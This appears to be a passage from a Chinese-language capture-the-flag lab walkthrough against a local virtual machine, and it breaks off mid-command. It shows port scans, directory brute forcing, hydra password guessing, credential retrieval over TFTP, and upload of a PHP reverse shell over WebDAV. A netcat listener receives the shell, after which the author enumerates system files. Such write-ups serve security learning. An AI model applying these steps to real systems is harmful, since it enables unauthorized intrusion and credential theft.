<br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -p22,80 192.1.1.129         <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-08 21:31 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.129<br>Host is up (0.00026s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>MAC Address: 00:0C:29:02:D4:D7 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.93 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sU --min-rate 10000 -p- 192.1.1.129<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-08 22:23 EDT<br>Warning: 192.1.1.129 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.129<br>Host is up (0.0017s latency).<br>All 65535 scanned ports on 192.1.1.129 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)<br>MAC Address: 00:0C:29:02:D4:D7 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 72.76 seconds<br></code></pre></td></tr></table></figure><h2 id="Web-查看"><a href="#Web-查看" class="headerlink" title="Web 查看"></a>Web 查看</h2><p>查看 Web 界面，和 zong 教相关。查看网页源代码和可点击元素，并且将图像下载下来看看是否有隐写</p><p><img src="/pic/6e9fdb4b00b764915e5aa6b7e6e573c1_MD5.png"></p><p>一开始点击了 do not click，看到了</p><p><img src="/pic/fb5a61fc53485faceef80dd05a360432_MD5.png"></p><p>一开始觉得这里的 <code>?</code> 是在暗示这里有代码执行的漏洞，尝试 <code>?cmd=whoami</code>，200 回应但是返回是相同的，尝试 wfuzz 进行模糊测试，依然没得到有效信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ wfuzz -c --hc 200 -w /usr/share/wordlists/wfuzz/general/big.txt http://192.1.1.129/images/666.jpg?FUZZ=something <br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://192.1.1.129/images/666.jpg?FUZZ=something</span><br><span class="hljs-string">Total requests: 3024</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload                                                                                                                     </span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 0</span><br><span class="hljs-string">Processed Requests: 3024</span><br><span class="hljs-string">Filtered Requests: 3024</span><br><span class="hljs-string">Requests/sec.: 0</span><br></code></pre></td></tr></table></figure><p>根据网址结构顺便看一下 images 路径，不过没什么价值</p><p><img src="/pic/cc0ac0c12d76eea9201103edb4783f8e_MD5.png"></p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>尝试目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.129 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.2.0-dev<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.129<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.2.0-dev<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/08 21:47:41 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/images               (Status: 301) [Size: 311] [--&gt; http://192.1.1.129/images/]<br>/webdav               (Status: 401) [Size: 458]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 215649 / 220561 (97.77%)===============================================================<br>2023/06/08 21:47:53 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>得到两个 <code>/images</code> 和 <code>/webdav</code> 目录，前一个已经看过了，而 <code>webdav</code> ，搜索了一下，是一种通信协议，可以进行上传下载文件，或者对上传文件进行操作。尝试访问 <code>webdav</code>，但是弹窗提醒需要用户名和密码，这里一开始是尝试爆破，使用 hydra 工具进行，先使用 cewl 进行字典收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ cewl http://192.1.1.129/ &gt; user.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ hydra -L user.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt 192.1.1.129 http-get /webdav <br>Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-08 22:15:43<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 82917 login tries (l:83/p:999), ~5183 tries per task<br>[DATA] attacking http-get://192.1.1.129:80/webdav<br>[STATUS] 8637.00 tries/min, 8637 tries <span class="hljs-keyword">in</span> 00:01h, 74280 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:09h, 16 active<br>[STATUS] 8794.33 tries/min, 26383 tries <span class="hljs-keyword">in</span> 00:03h, 56534 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:07h, 16 active<br></code></pre></td></tr></table></figure><p>实在太慢了……那就只能考虑一些别的思路，之前目录爆破的时候没加后缀，这次加上常见的后缀</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.129 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -x txt,zip,sql,rar<br>===============================================================<br>Gobuster v3.2.0-dev<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.129<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.2.0-dev<br>[+] Extensions:              txt,zip,sql,rar<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/08 22:24:37 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/images               (Status: 301) [Size: 311] [--&gt; http://192.1.1.129/images/]<br>/tips.txt             (Status: 200) [Size: 58]<br>/webdav               (Status: 401) [Size: 458]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 1099441 / 1102805 (99.69%)===============================================================<br>2023/06/08 22:25:42 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>有个 <code>tips.txt</code> ，看一看</p><p><img src="/pic/f210440ffc1584abc27236b30612724b_MD5.png"></p><p>给了提示 <code>creds.txt</code>，这个文件并不在主目录下，简单分析猜测可能是在 <code>webdav</code> 里，这里卡了很久，没有合适的思路，爆破又没得到结果，看了眼红队笔记的视频，原来是 nmap 扫描中 UDP 扫描的结果有点问题，这次指定对最常用的端口进行扫描</p><h2 id="tftp-渗透"><a href="#tftp-渗透" class="headerlink" title="tftp 渗透"></a>tftp 渗透</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sU --top-ports 20 192.1.1.129 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-08 22:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.129<br>Host is up (0.00028s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   open|filtered ntp<br>135/udp   closed        msrpc<br>137/udp   open|filtered netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   open|filtered snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   open|filtered isakmp<br>514/udp   open|filtered syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  open|filtered ms-sql-m<br>1900/udp  open|filtered upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 00:0C:29:02:D4:D7 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.39 seconds<br></code></pre></td></tr></table></figure><p><code>tftp</code> 可能开启了，但是不确定，那就直接试试吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ tftp 192.1.1.129 <br>tftp&gt; <span class="hljs-built_in">ls</span><br>?Invalid <span class="hljs-built_in">command</span><br>tftp&gt; <span class="hljs-built_in">help</span><br>?Invalid <span class="hljs-built_in">command</span><br>tftp&gt; ?<br>Commands may be abbreviated.  Commands are:<br><br>connect         connect to remote tftp<br>mode            <span class="hljs-built_in">set</span> file transfer mode<br>put             send file<br>get             receive file<br>quit            <span class="hljs-built_in">exit</span> tftp<br>verbose         toggle verbose mode<br>trace           toggle packet tracing<br>status          show current status<br>binary          <span class="hljs-built_in">set</span> mode to octet<br>ascii           <span class="hljs-built_in">set</span> mode to netascii<br>rexmt           <span class="hljs-built_in">set</span> per-packet retransmission <span class="hljs-built_in">timeout</span><br><span class="hljs-built_in">timeout</span>         <span class="hljs-built_in">set</span> total retransmission <span class="hljs-built_in">timeout</span><br>?               <span class="hljs-built_in">print</span> <span class="hljs-built_in">help</span> information<br>tftp&gt; get creds.txt<br>Received 22 bytes <span class="hljs-keyword">in</span> 0.0 seconds<br></code></pre></td></tr></table></figure><p>找到了 <code>creds.txt</code> 在本地查看查看其中的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">cat</span> creds.txt <br>eWFtZG9vdDpTd2FyZw==<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">cat</span> creds.txt | <span class="hljs-built_in">base64</span> -d<br>yamdoot:Swarg<br></code></pre></td></tr></table></figure><p>使用 <code>cadaver</code> 来进行交互，根据网络搜索的资料，发现可以上传文件，然后在浏览器端进行访问达到反弹 shell 的目的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ cadaver http://192.1.1.129/webdav<br>Authentication required <span class="hljs-keyword">for</span> webdav on server 192.1.1.129:<br>Username: yamdoot<br>Password: <br>dav:/webdav/&gt; <span class="hljs-built_in">ls</span><br>Listing collection `/webdav/`: collection is empty.<br>dav:/webdav/&gt; ?<br>Available commands: <br> <span class="hljs-built_in">ls</span>         <span class="hljs-built_in">cd</span>         <span class="hljs-built_in">pwd</span>        put        get        mget       mput       <br> edit       less       mkcol      <span class="hljs-built_in">cat</span>        delete     rmcol      copy       <br> move       lock       unlock     discover   steal      showlocks  version    <br> checkin    checkout   uncheckout <span class="hljs-built_in">history</span>    label      propnames  chexec     <br> propget    propdel    propset    search     <span class="hljs-built_in">set</span>        open       close      <br> <span class="hljs-built_in">echo</span>       quit       <span class="hljs-built_in">unset</span>      lcd        lls        lpwd       <span class="hljs-built_in">logout</span>     <br> <span class="hljs-built_in">help</span>       describe   about      <br>Aliases: <span class="hljs-built_in">rm</span>=delete, <span class="hljs-built_in">mkdir</span>=mkcol, <span class="hljs-built_in">mv</span>=move, <span class="hljs-built_in">cp</span>=copy, more=less, quit=<span class="hljs-built_in">exit</span>=<span class="hljs-built_in">bye</span><br>dav:/webdav/&gt; <span class="hljs-built_in">pwd</span><br>Current collection is `http://192.1.1.129/webdav/`.<br>dav:/webdav/&gt; put php-reverse-shell.php<br>Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php`:<br>Progress: [=============================&gt;] 100.0% of 5493 bytes succeeded.<br></code></pre></td></tr></table></figure><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 1234           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 1234 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.129] 34332<br>Linux ubuntu 4.15.0-20-generic <span class="hljs-comment">#21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br> 19:36:29 up  1:09,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 1.14, 1.72<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">/bin/sh: 4: python: not found</span><br><span class="hljs-string">$ python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@ubuntu:/$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">[sudo] password for www-data: </span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data: </span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data: </span><br><span class="hljs-string"></span><br><span class="hljs-string">sudo: 3 incorrect password attempts</span><br><span class="hljs-string">www-data@ubuntu:/$ cat /etc/passwd</span><br><span class="hljs-string">cat /etc/passwd</span><br><span class="hljs-string">root:x:0:0:root:/root:/bin/bash</span><br><span class="hljs-string">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="hljs-string">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="hljs-string">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="hljs-string">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="hljs-string">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="hljs-string">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="hljs-string">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="hljs-string">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="hljs-string">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="hljs-string">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="hljs-string">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="hljs-string">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="hljs-string">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="hljs-string">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="hljs-string">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="hljs-string">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="hljs-string">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="hljs-string">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="hljs-string">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="hljs-string">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="hljs-string">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="hljs-string">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="hljs-string">uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin</span><br><span class="hljs-string">narak:x:1000:1000:narak,,,:/home/narak:/bin/bash</span><br><span class="hljs-string">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="hljs-string">yamdoot:x:1001:1001:,,,:/home/yamdoot:/bin/bash</span><br><span class="hljs-string">inferno:x:1002:1002:,,,:/home/inferno:/bin/bash</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>看到有个用户名是 yamdoot，试试有没有可能和之前得到的 webdav 使用的是同一个密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/$ su yamdoot<br>su yamdoot<br>Password: Swarg<br><br>su: Authentication failure<br></code></pre></td></tr></table></figure><p>失败，信息收集 ing</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/$ <span class="hljs-built_in">cd</span> /var/www<br><span class="hljs-built_in">cd</span> /var/www<br>www-data@ubuntu:/var/www$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>DavLock  html  webdav<br>www-data@ubuntu:/var/www$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 24K<br>920702 drwxr-xr-x  4 www-data www-data 4.0K Sep 21  2020 .<br>917591 drwxr-xr-x 12 root     root     4.0K Sep 21  2020 ..<br>918264 -rwxr-xr-x  1 www-data www-data  12K Sep 21  2020 DavLock<br>920703 drwxr-xr-x  3 www-data www-data 4.0K Sep 22  2020 html<br>917601 drwxr-xr-x  2 www-data www-data 4.0K Jun  8 19:36 webdav<br>www-data@ubuntu:/var/www$ <span class="hljs-built_in">cat</span> DavLock <br><span class="hljs-built_in">cat</span> DavLock<br>�d�4эh^www-data@ubuntu:/var/www$ <span class="hljs-built_in">cp</span> DavLock ./webdav<br><span class="hljs-built_in">cp</span> DavLock ./webdav<br><br></code></pre></td></tr></table></figure><p>看到个奇怪的文件，把它放到 webdav 上，下载到本地。本地查看也没有效信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/var/backups$ <span class="hljs-built_in">cat</span> /etc/shadow<br><span class="hljs-built_in">cat</span> /etc/shadow<br><span class="hljs-built_in">cat</span>: /etc/shadow: Permission denied<br>www-data@ubuntu:/var/backups$ <span class="hljs-built_in">id</span> <br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@ubuntu:/var/backups$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br>www-data@ubuntu:/var/backups$ <span class="hljs-built_in">export</span><br><span class="hljs-built_in">export</span><br><span class="hljs-built_in">declare</span> -x APACHE_LOCK_DIR=<span class="hljs-string">&quot;/var/lock/apache2&quot;</span><br><span class="hljs-built_in">declare</span> -x APACHE_LOG_DIR=<span class="hljs-string">&quot;/var/log/apache2&quot;</span><br><span class="hljs-built_in">declare</span> -x APACHE_PID_FILE=<span class="hljs-string">&quot;/var/run/apache2/apache2.pid&quot;</span><br><span class="hljs-built_in">declare</span> -x APACHE_RUN_DIR=<span class="hljs-string">&quot;/var/run/apache2&quot;</span><br><span class="hljs-built_in">declare</span> -x APACHE_RUN_GROUP=<span class="hljs-string">&quot;www-data&quot;</span><br><span class="hljs-built_in">declare</span> -x APACHE_RUN_USER=<span class="hljs-string">&quot;www-data&quot;</span><br><span class="hljs-built_in">declare</span> -x INVOCATION_ID=<span class="hljs-string">&quot;1f3b99dd50fd422fa2154b386d70fd95&quot;</span><br><span class="hljs-built_in">declare</span> -x JOURNAL_STREAM=<span class="hljs-string">&quot;9:17364&quot;</span><br><span class="hljs-built_in">declare</span> -x LANG=<span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-built_in">declare</span> -x OLDPWD=<span class="hljs-string">&quot;/var&quot;</span><br><span class="hljs-built_in">declare</span> -x PATH=<span 